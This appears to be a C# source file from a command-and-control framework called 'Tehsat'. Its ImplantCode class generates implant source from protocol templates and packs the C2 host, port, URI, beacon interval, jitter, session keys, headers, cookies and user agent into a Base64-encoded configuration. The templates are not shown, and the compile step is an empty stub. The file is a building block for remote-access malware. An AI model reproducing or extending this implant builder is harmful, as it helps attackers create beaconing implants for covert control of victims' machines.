using System;
using System.Text;
using System.IO;
using System.Collections.Generic;
using System.Text.Json;

namespace Tehsat
{
    public class ImplantCode
    {
        public String iType { get; set; }
        public ImplantGenerated iGen { get; set; }

        public ImplantCode(String itype, ImplantGenerated igen)
        {
            iType = itype;
            iGen = igen;
        }

        public String GenerateCSharpSourceCode()
        {
            // Load the main code
            String csharpcode = LoadMainTemplate();
            

            // Create a dictionary to track loaded modules 
            Dictionary<String, Boolean> c2classes = new Dictionary<String, Boolean>()
            {
                { "HTTP", false},
                { "HTTP Websocket", false},
                { "TCP", false},
                { "UDP", false}
            };

            // Loop all channels to load necessary socket classes
            String c2classes_code = "";
            String condition_code = "";
            foreach (var c in iGen.Channels)
            {
                if (!c2classes[c.Value.Protocol])
                {
                    // Prepare the classess
                    c2classes_code += LoadSocketTemplate(c.Value.Protocol);

                    // Prepare the conditions
                    condition_code += LoadConditionTemplate(c.Value.Protocol);

                    c2classes[c.Value.Protocol] = true;
                }
            }

            // Generate configuration as Base64
            string configurations_b64 = GenerateConfiguration(iGen.Channels);

            // Add the configuration and classess to the code
            csharpcode = csharpcode.Replace("CONFIGURATION_CONTEXT", configurations_b64);
            csharpcode = csharpcode.Replace("CONFIGURATION_CLASS_CONTEXT", LoadConfigurationTemplate());
            csharpcode = csharpcode.Replace("WEBSOCKET_CONTEXT", c2classes_code);
            csharpcode = csharpcode.Replace("CONDITION_CONTEXT", condition_code);

            return csharpcode;
        }

        public String CompileCSharpSourceCode()
        {
            return "";
        }

        public String GenerateConfiguration(Dictionary<string, Channel> channels)
        {
            string implantId = Common.RandomStringGenerator(16);
            Dictionary<string, Dictionary<string, string>> configurations = new Dictionary<string, Dictionary<string, string>>();

            foreach (var c in iGen.Channels)
            {
                string HTTPRequestHeaders_json = JsonSerializer.Serialize(c.Value.HTTPRequestHeaders);
                string HTTPRequestHeaders_b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(HTTPRequestHeaders_json));

                string Cookies_json = JsonSerializer.Serialize(c.Value.Cookies);
                string Cookies_b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(Cookies_json));

                Dictionary<string, string> configuration = new Dictionary<string, string>()
                {
                    { "ID", implantId },
                    { "PROTOCOL", c.Value.Protocol },
                    { "HOST", c.Value.Host },
                    { "PORT", c.Value.Port.ToString() },
                    { "C2URI", c.Value.GetUri() },
                    { "INTERVAL", c.Value.Interval.ToString() },
                    { "JITTER", c.Value.Jitter.ToString() },
                    { "SESSION_KEY", "SESSIONKEY_CONTEXT" },
                    { "SESSION_IV", "SESSIONIV_CONTEXT" },
                    { "REQUEST", c.Value.RequestContent },
                    { "REQUESTMETHOD", c.Value.HTTPRequestMethod },
                    { "BINARY", c.Value.Binary.ToString() },
                    { "HTTPHEADERS", HTTPRequestHeaders_b64 },
                    { "COOKIES", Cookies_b64 },
                    { "HTTPUA", c.Value.HTTPUserAgent },
                };
                configurations[implantId + " " + c.Value.GetUri()] = configuration;
            }

            string configurations_json = JsonSerializer.Serialize(configurations);
            string configurations_b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(configurations_json));


            return configurations_b64;
        }

        public String LoadConfigurationTemplate()
        {
            string csharpcode = File.ReadAllText(@"Data/Templates/ImplantTemplate-ConfigurationCSharp.cs.txt");
            return csharpcode;
        }

        public String LoadMainTemplate()
        {
            string csharpcode = File.ReadAllText(@"Data/Templates/ImplantTemplate-MainCSharp.cs.txt");
            return csharpcode;
        }

        public String LoadSocketTemplate(String proto)
        {
            string csharpcode = "";
            switch (proto)
            {
                case "TCP":
                    csharpcode = File.ReadAllText(@"Data/Templates/ImplantTemplate-TCPCSharp.cs.txt");
                    break;
                case "UDP":
                    csharpcode = File.ReadAllText(@"Data/Templates/ImplantTemplate-UDPCSharp.cs.txt");
                    break;
                case "HTTP":
                    csharpcode = File.ReadAllText(@"Data/Templates/ImplantTemplate-HTTPCSharp.cs.txt");
                    break;
                case "HTTP Websocket":
                    csharpcode = File.ReadAllText(@"Data/Templates/ImplantTemplate-WebsocketCSharp.cs.txt");
                    break;
            }
            return csharpcode;
        }

        public String LoadConditionTemplate(String proto)
        {
            string csharpcode = "";
            switch (proto)
            {
                case "TCP":
                    csharpcode = File.ReadAllText(@"Data/Templates/ImplantTemplate-TCPCSharp-Case.cs.txt");
                    break;
                case "UDP":
                    csharpcode = File.ReadAllText(@"Data/Templates/ImplantTemplate-UDPCSharp-Case.cs.txt");
                    break;
                case "HTTP":
                    csharpcode = File.ReadAllText(@"Data/Templates/ImplantTemplate-HTTPCSharp-Case.cs.txt");
                    break;
                case "HTTP Websocket":
                    csharpcode = File.ReadAllText(@"Data/Templates/ImplantTemplate-WebsocketCSharp-Case.cs.txt");
                    break;
            }
            return csharpcode;
        }
    }
}
